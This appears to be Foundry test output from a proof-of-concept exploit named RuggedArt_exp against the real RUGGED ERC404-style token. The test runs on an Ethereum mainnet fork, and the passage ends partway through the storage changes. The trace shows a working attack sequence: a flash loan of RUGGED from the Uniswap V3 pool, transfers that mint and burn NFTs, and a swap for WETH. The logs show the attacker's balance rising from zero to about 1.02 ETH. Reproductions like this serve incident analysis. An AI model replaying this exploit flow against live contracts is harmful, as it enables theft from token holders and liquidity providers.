No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 8866 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea1: 0 → 9050
    │   │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 31 → 0
    │   │   │   │   @ 0xc8484a9c616cb67c27f593b48ffe54729d74cd0d1283a417af32248e41bfea2d: 1 → 0
    │   │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 32 → 0
    │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e93: 0 → 6049
    │   │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 7991 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea6: 0 → 7991
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e94: 0 → 3913
    │   │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea0: 0 → 3033
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e92: 0 → 8796
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daa: 7093 → 0
    │   │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea2: 0 → 347
    │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea5: 0 → 4945
    │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dab: 4090 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da2: 347 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea4: 0 → 3270
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da8: 1933 → 0
    │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 1 → 0
    │   │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 1 → 0
    │   │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 1 → 0
    │   │   │   │   @ 0x6fb6557de3395141aa9888cf395b4ffde37db51885d9441c1ec68fa29c9426c1: 18 → 0
    │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 25 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea3: 0 → 8866
    │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x5e32d5a093587ea83172d78e4cf06f0f12106514810a73d0f00754720c616eba: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 1 → 0
    │   │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 33 → 0
    │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 38 → 0
    │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e97: 0 → 3978
    │   │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 35 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e96: 0 → 4984
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da7: 9192 → 0
    │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 39 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e98: 0 → 3525
    │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 27 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da4: 3033 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da9: 9017 → 0
    │   │   │   │   @ 0x504bc497861524e4f3253374b489f795e782adf5020e9e57a36098f9643e6e4f: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9d: 0 → 9192
    │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 21 → 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356631570739218611936 [3.566e20]
    │   ├─ [534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 22000000000000000000 [2.2e19], amount1: 0, paid0: 66000000000000000 [6.6e16], paid1: 0)
    │   ├─  storage changes:
    │   │   @ 1: 0x000000000000000000000000000000003a7699bbc9c96c3deec57c059f546883 → 0x000000000000000000000000000000003aa88b9ffe2882fded2e2b9b65b33411
    │   └─ ← [Stop]
    ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 18016421081864000000 [1.801e19]
    ├─ [633654] pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 18016421081864000000 [1.801e19], 4295128740 [4.295e9], 0x61)
    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1023851896415447765 [1.023e18])
    │   │   ├─ emit Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1023851896415447765 [1.023e18])
    │   │   ├─  storage changes:
    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000000e3573e00c73ead5
    │   │   │   @ 0x915702112e720f3803b98e5e7e2e96395c82ee256d913fe1f4a2358e93a7c7e1: 0x0000000000000000000000000000000000000000000000012863cbff3bd529ef → 0x0000000000000000000000000000000000000000000000011a2e581f2f613f1a
    │   │   └─ ← [Return] true
    │   ├─ [630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356631570739218611936 [3.566e20]
    │   ├─ [576330] ContractTest::uniswapV3SwapCallback(18016421081864000000 [1.801e19], -1023851896415447765 [-1.023e18], 0x61)
    │   │   ├─ [266] pool::token0() [staticcall]
    │   │   │   └─ ← [Return] RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F]
    │   │   ├─ [573788] RUGGED::transfer(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 18016421081864000000 [1.801e19])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8565)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6115)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2628)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9307)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4825)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8298)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2178)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 454)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 5301)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1922)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3061)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6901)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1878)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2740)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3145)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 2347)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 5163)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9721)
    │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], amount: 18016421081864000000 [1.801e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x872e7f9f7462ef7a0e5efd05076b73b65d2ce8f2ada2ecddc8404a11d481b8c6: 5 → 0
    │   │   │   │   @ 0x0c8e29e5c3c5e5a955d23e008a0f020d8d53d6cafdaed173b7ee3d98026d9203: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xc44e133743d3b6295b51b8fa55477e753b7bed529f4012071e26ceeef19ce249: 9 → 0
    │   │   │   │   @ 0x3f27bad07d66f01a13e4dca028de45479910dc964566275ff6bfb3bb3207ec2d: 1 → 0
    │   │   │   │   @ 0x82f4d7c11375b87ddfb81e798edced85ca4e17c63404f3faeb689d8ba2aa5a8f: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea8: 0 → 6115
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eae: 0 → 454
    │   │   │   │   @ 0x005c6ed66846fc515ed43c3a7e1e64071c3e3de822e0aa78beb8011e21b028c7: 7 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 1878 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 4825 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ead: 0 → 2178
    │   │   │   │   @ 0x7c7ec41f0fe372c56501c68fd98a087764885a027016bf9746b8fd54fe0df27d: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb0: 0 → 1922
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 2628 → 0
    │   │   │   │   @ 5: 4343 → 4361
    │   │   │   │   @ 0x135cf6d18023edee06366a283ef957c17bc8b8cfaac068cc23d9db87ba8679d1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x817844a56a10400b5a0ac9915d9efbef84df08c489c1f6bbe1538f791f470152: 1 → 0
    │   │   │   │   @ 0x1aa357a72ac6cef8a628616782ff99e86fb3930371d27c8f70f7aa9e81dbf9db: 17 → 0
    │   │   │   │   @ 0x6e371ab298d0c967d21204d9cdbf6c8cb65922083ca8f8a9f108502074c2fde5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x26756a58c06be82225c58452e74884c1bc536dd536163ed32052baf0161d7d40: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea7: 0 → 8565
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb5: 0 → 3145
    │   │   │   │   @ 0x8fe9c7761fb3cbc9ba6fd3831fbece59bb1def254dead1d1481e9454208ae9fb: 1 → 0
    │   │   │   │   @ 0xcca05c8af9cc32c65ebff8406e489e0983b1e51968f66b29cda56497843c7da7: 13 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 6115 → 0
    │   │   │   │   @ 0x70d14f64198fc84935b563f3fbc037601cd4b04ce777cc8059042c398ffac7df: 1 → 0
    │   │   │   │   @ 0x42988fb2c63d1fe882de023bd02490c0205d477bb3ad273495cf1754a7dcc067: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 2178 → 0
    │   │   │   │   @ 0x887529a192ce9ebe7537a9caab5b33fc14569cb7eb551250f939ce002fe166ec: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb4: 0 → 2740
    │   │   │   │   @ 0xa2133436b58a260f8d006c27fb45bb008e0a093024f113527ab0cae7cf6546f5: 15 → 0
    │   │   │   │   @ 0x4796c0d0de7d82a152318260b85e11da98682a79138229bc7448d55c9dcb2524: 1 → 0
    │   │   │   │   @ 0x3355c01dc6e56c347923e44bfab018cce5e69e9a0387020066709d5119f1b442: 1 → 0
    │   │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000135541dc1280b7fee0 → 0x0000000000000000000000000000000000000000000000144f490b975514d0e0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 6901 → 0
    │   │   │   │   @ 0x095824e88dea8d46c87f19b8a6713c69c79d72628d4cca70e6a6bac672024011: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 9307 → 0
    │   │   │   │   @ 0xc1860ce56ba86a1c2302c502ec1f8e3e57a8623b3970a44749756c6a2fc4cf2d: 1 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 3061 → 0
    │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000fa072f84d45cd200 → 0
    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 8298 → 0
    │   │   │   │   @ 0x4b0ca68d5c930d1fb6dab784de2b1e3ba61a507389545b34f08a6ebfbf223465: 1 → 0
    │   │   │   │   @ 0xc9f666f45d0a0b19c89a6e44a37411863c4f5fb578ced965b0da04773f9b97f8: 1 → 0
    │   │   │   │   @ 0xe244fb5fa0726d3288990465e011945de3c92b84ad73f9120b1478d38a848c98: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0xb775dab96be1e8e7c15e77effa45a1c6e6f5c40d88035a5fc55eadbf8002a215: 1 → 0
    │   │   │   │   @ 0x84288e8807e18f9bb068ee64f35b6c8f0658750997493a087aadee42e9297dd7: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
    │   │   │   │   @ 0x228853ddf7f3c5a0e9dd7666efc7af3453bacc425b0915f61f65274a0a38d3f4: 1 → 0
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb1: 0 → 3061
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eaf: 0 → 5301
    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4eb6: 0 → 2347
